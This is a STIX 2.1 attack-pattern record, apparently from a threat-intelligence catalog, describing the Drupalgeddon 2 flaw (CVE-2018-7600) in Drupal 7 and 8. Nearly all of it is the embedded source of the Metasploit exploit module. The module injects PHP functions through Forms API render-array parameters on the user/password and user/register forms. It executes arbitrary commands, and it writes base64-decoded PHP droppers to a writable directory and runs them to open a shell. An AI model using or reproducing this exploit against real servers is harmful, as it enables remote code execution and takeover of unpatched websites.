{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45e874d7-01e1-4bfe-8519-e2a1afcd27a2",
    "created": "2024-08-14T17:12:03.941107Z",
    "modified": "2024-08-14T17:12:03.94111Z",
    "name": "Drupal Drupalgeddon 2 Forms API Property Injection",
    "description": " This module exploits a Drupal property injection in the Forms API.  Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are vulnerable. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/drupal_drupalgeddon2.rb",
            "external_id": "drupal_drupalgeddon2.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-7600"
        },
        {
            "source_name": "reference",
            "url": "https://www.drupal.org/sa-core-2018-002"
        },
        {
            "source_name": "reference",
            "url": "https://greysec.net/showthread.php?tid=2912"
        },
        {
            "source_name": "reference",
            "url": "https://research.checkpoint.com/uncovering-drupalgeddon-2/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/a2u/CVE-2018-7600"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/nixawk/labs/issues/19"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/FireFart/CVE-2018-7600"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HTTP::Drupal\n  # XXX: CmdStager can't handle badchars\n  include Msf::Exploit::PhpEXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Drupal Drupalgeddon 2 Forms API Property Injection',\n      'Description'    => %q{\n        This module exploits a Drupal property injection in the Forms API.\n\n        Drupal 6.x, < 7.58, 8.2.x, < 8.3.9, < 8.4.6, and < 8.5.1 are vulnerable.\n      },\n      'Author'         => [\n        'Jasper Mattsson', # Vulnerability discovery\n        'a2u',             # Proof of concept (Drupal 8.x)\n        'Nixawk',          # Proof of concept (Drupal 8.x)\n        'FireFart',        # Proof of concept (Drupal 7.x)\n        'wvu'              # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2018-7600'],\n        ['URL', 'https://www.drupal.org/sa-core-2018-002'],\n        ['URL', 'https://greysec.net/showthread.php?tid=2912'],\n        ['URL', 'https://research.checkpoint.com/uncovering-drupalgeddon-2/'],\n        ['URL', 'https://github.com/a2u/CVE-2018-7600'],\n        ['URL', 'https://github.com/nixawk/labs/issues/19'],\n        ['URL', 'https://github.com/FireFart/CVE-2018-7600']\n      ],\n      'DisclosureDate' => '2018-03-28',\n      'License'        => MSF_LICENSE,\n      'Platform'       => ['php', 'unix', 'linux'],\n      'Arch'           => [ARCH_PHP, ARCH_CMD, ARCH_X86, ARCH_X64],\n      'Privileged'     => false,\n      'Payload'        => {'BadChars' => '&>\\''},\n      'Targets'        => [\n        #\n        # Automatic targets (PHP, cmd/unix, native)\n        #\n        ['Automatic (PHP In-Memory)',\n          'Platform'   => 'php',\n          'Arch'       => ARCH_PHP,\n          'Type'       => :php_memory\n        ],\n        ['Automatic (PHP Dropper)',\n          'Platform'   => 'php',\n          'Arch'       => ARCH_PHP,\n          'Type'       => :php_dropper\n        ],\n        ['Automatic (Unix In-Memory)',\n          'Platform'   => 'unix',\n          'Arch'       => ARCH_CMD,\n          'Type'       => :unix_memory\n        ],\n        ['Automatic (Linux Dropper)',\n          'Platform'   => 'linux',\n          'Arch'       => [ARCH_X86, ARCH_X64],\n          'Type'       => :linux_dropper\n        ],\n        #\n        # Drupal 7.x targets (PHP, cmd/unix, native)\n        #\n        ['Drupal 7.x (PHP In-Memory)',\n          'Platform'   => 'php',\n          'Arch'       => ARCH_PHP,\n          'Version'    => Rex::Version.new('7'),\n          'Type'       => :php_memory\n        ],\n        ['Drupal 7.x (PHP Dropper)',\n          'Platform'   => 'php',\n          'Arch'       => ARCH_PHP,\n          'Version'    => Rex::Version.new('7'),\n          'Type'       => :php_dropper\n        ],\n        ['Drupal 7.x (Unix In-Memory)',\n          'Platform'   => 'unix',\n          'Arch'       => ARCH_CMD,\n          'Version'    => Rex::Version.new('7'),\n          'Type'       => :unix_memory\n        ],\n        ['Drupal 7.x (Linux Dropper)',\n          'Platform'   => 'linux',\n          'Arch'       => [ARCH_X86, ARCH_X64],\n          'Version'    => Rex::Version.new('7'),\n          'Type'       => :linux_dropper\n        ],\n        #\n        # Drupal 8.x targets (PHP, cmd/unix, native)\n        #\n        ['Drupal 8.x (PHP In-Memory)',\n          'Platform'   => 'php',\n          'Arch'       => ARCH_PHP,\n          'Version'    => Rex::Version.new('8'),\n          'Type'       => :php_memory\n        ],\n        ['Drupal 8.x (PHP Dropper)',\n          'Platform'   => 'php',\n          'Arch'       => ARCH_PHP,\n          'Version'    => Rex::Version.new('8'),\n          'Type'       => :php_dropper\n        ],\n        ['Drupal 8.x (Unix In-Memory)',\n          'Platform'   => 'unix',\n          'Arch'       => ARCH_CMD,\n          'Version'    => Rex::Version.new('8'),\n          'Type'       => :unix_memory\n        ],\n        ['Drupal 8.x (Linux Dropper)',\n          'Platform'   => 'linux',\n          'Arch'       => [ARCH_X86, ARCH_X64],\n          'Version'    => Rex::Version.new('8'),\n          'Type'       => :linux_dropper\n        ]\n      ],\n      'DefaultTarget'  => 0, # Automatic (PHP In-Memory)\n      'DefaultOptions' => {'WfsDelay' => 2}, # Also seconds between attempts\n      'Notes'          => {\n        'Stability' => [CRASH_SAFE],\n        'SideEffects' => [],\n        'Reliability' => [],\n        'AKA' => ['SA-CORE-2018-002', 'Drupalgeddon 2']}\n    ))\n\n    register_options([\n      OptString.new('PHP_FUNC',  [true, 'PHP function to execute', 'passthru']),\n      OptBool.new('DUMP_OUTPUT', [false, 'Dump payload command output', false])\n    ])\n\n    register_advanced_options([\n      OptString.new('WritableDir', [true, 'Writable dir for droppers', '/tmp'])\n    ])\n  end\n\n  def check\n    checkcode = CheckCode::Unknown\n\n    @version = target['Version'] || drupal_version\n\n    unless @version\n      vprint_error('Could not determine Drupal version to target')\n      return checkcode\n    end\n\n    vprint_status(\"Drupal #{@version} targeted at #{full_uri}\")\n    checkcode = CheckCode::Detected\n\n    changelog = drupal_changelog(@version)\n\n    unless changelog\n      vprint_error('Could not determine Drupal patch level')\n      return checkcode\n    end\n\n    case drupal_patch(changelog, 'SA-CORE-2018-002')\n    when nil\n      vprint_warning('CHANGELOG.txt no longer contains patch level')\n    when true\n      vprint_warning('Drupal appears patched in CHANGELOG.txt')\n      checkcode = CheckCode::Safe\n    when false\n      vprint_good('Drupal appears unpatched in CHANGELOG.txt')\n      checkcode = CheckCode::Appears\n    end\n\n    # NOTE: Exploiting the vuln will move us from \"Safe\" to Vulnerable\n    token = rand_str\n    res   = execute_command(token, func: 'printf')\n\n    return checkcode unless res\n\n    if res.body.start_with?(token)\n      vprint_good('Drupal is vulnerable to code execution')\n      checkcode = CheckCode::Vulnerable\n    end\n\n    checkcode\n  end\n\n  def exploit\n    unless @version\n      print_warning('Targeting Drupal 7.x as a fallback')\n      @version = Rex::Version.new('7')\n    end\n\n    if datastore['PAYLOAD'] == 'cmd/unix/generic'\n      print_warning('Enabling DUMP_OUTPUT for cmd/unix/generic')\n      # XXX: Naughty datastore modification\n      datastore['DUMP_OUTPUT'] = true\n    end\n\n    # NOTE: assert() is attempted first, then PHP_FUNC if that fails\n    case target['Type']\n    when :php_memory\n      execute_command(payload.encoded, func: 'assert')\n\n      sleep(wfs_delay)\n      return if session_created?\n\n      # XXX: This will spawn a *very* obvious process\n      execute_command(\"php -r '#{payload.encoded}'\")\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :php_dropper, :linux_dropper\n      dropper_assert\n\n      sleep(wfs_delay)\n      return if session_created?\n\n      dropper_exec\n    end\n  end\n\n  def dropper_assert\n    php_file = Pathname.new(\n      \"#{datastore['WritableDir']}/#{rand_str}.php\"\n    ).cleanpath\n\n    # Return the PHP payload or a PHP binary dropper\n    dropper = get_write_exec_payload(\n      writable_path: datastore['WritableDir'],\n      unlink_self:   true # Worth a shot\n    )\n\n    # Encode away potential badchars with Base64\n    dropper = Rex::Text.encode_base64(dropper)\n\n    # Stage 1 decodes the PHP and writes it to disk\n    stage1 = %Q{\n      file_put_contents(\"#{php_file}\", base64_decode(\"#{dropper}\"));\n    }\n\n    # Stage 2 executes said PHP in-process\n    stage2 = %Q{\n      include_once(\"#{php_file}\");\n    }\n\n    # :unlink_self may not work, so let's make sure\n    register_file_for_cleanup(php_file)\n\n    # Hopefully pop our shell with assert()\n    execute_command(stage1.strip, func: 'assert')\n    execute_command(stage2.strip, func: 'assert')\n  end\n\n  def dropper_exec\n    php_file = \"#{rand_str}.php\"\n    tmp_file = Pathname.new(\n      \"#{datastore['WritableDir']}/#{php_file}\"\n    ).cleanpath\n\n    # Return the PHP payload or a PHP binary dropper\n    dropper = get_write_exec_payload(\n      writable_path: datastore['WritableDir'],\n      unlink_self:   true # Worth a shot\n    )\n\n    # Encode away potential badchars with Base64\n    dropper = Rex::Text.encode_base64(dropper)\n\n    # :unlink_self may not work, so let's make sure\n    register_file_for_cleanup(php_file)\n\n    # Write the payload or dropper to disk (!)\n    # NOTE: Analysis indicates > is a badchar for 8.x\n    execute_command(\"echo #{dropper} | base64 -d | tee #{php_file}\")\n\n    # Attempt in-process execution of our PHP script\n    send_request_cgi(\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, php_file)\n    )\n\n    sleep(wfs_delay)\n    return if session_created?\n\n    # Try to get a shell with PHP CLI\n    execute_command(\"php #{php_file}\")\n\n    sleep(wfs_delay)\n    return if session_created?\n\n    register_file_for_cleanup(tmp_file)\n\n    # Fall back on our temp file\n    execute_command(\"echo #{dropper} | base64 -d | tee #{tmp_file}\")\n    execute_command(\"php #{tmp_file}\")\n  end\n\n  def execute_command(cmd, opts = {})\n    func = opts[:func] || datastore['PHP_FUNC'] || 'passthru'\n\n    vprint_status(\"Executing with #{func}(): #{cmd}\")\n\n    res =\n      case @version.to_s\n      when /^7\\b/\n        exploit_drupal7(func, cmd)\n      when /^8\\b/\n        exploit_drupal8(func, cmd)\n      end\n\n    return unless res\n\n    if res.code == 200\n      print_line(res.body) if datastore['DUMP_OUTPUT']\n    else\n      print_error(\"Unexpected reply: #{res.inspect}\")\n    end\n\n    res\n  end\n\n  def exploit_drupal7(func, code)\n    vars_get = {\n      'q'                    => 'user/password',\n      'name[#post_render][]' => func,\n      'name[#markup]'        => code,\n      'name[#type]'          => 'markup'\n    }\n\n    vars_post = {\n      'form_id'                  => 'user_pass',\n      '_triggering_element_name' => 'name'\n    }\n\n    res = send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path),\n      'vars_get'  => vars_get,\n      'vars_post' => vars_post\n    )\n\n    return res unless res && res.code == 200\n\n    form_build_id = res.get_html_document.at(\n      '//input[@name = \"form_build_id\"]/@value'\n    )\n\n    return res unless form_build_id\n\n    vars_get = {\n      'q' => \"file/ajax/name/#value/#{form_build_id.value}\"\n    }\n\n    vars_post = {\n      'form_build_id' => form_build_id.value\n    }\n\n    send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path),\n      'vars_get'  => vars_get,\n      'vars_post' => vars_post\n    )\n  end\n\n  def exploit_drupal8(func, code)\n    # Clean URLs are enabled by default and \"can't\" be disabled\n    uri = normalize_uri(target_uri.path, 'user/register')\n\n    vars_get = {\n      'element_parents' => 'account/mail/#value',\n      'ajax_form'       => 1,\n      '_wrapper_format' => 'drupal_ajax'\n    }\n\n    vars_post = {\n      'form_id'              => 'user_register_form',\n      '_drupal_ajax'         => 1,\n      'mail[#type]'          => 'markup',\n      'mail[#post_render][]' => func,\n      'mail[#markup]'        => code\n    }\n\n    send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => uri,\n      'vars_get'  => vars_get,\n      'vars_post' => vars_post\n    )\n  end\n\n  def rand_str\n    Rex::Text.rand_text_alphanumeric(8..42)\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-03-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}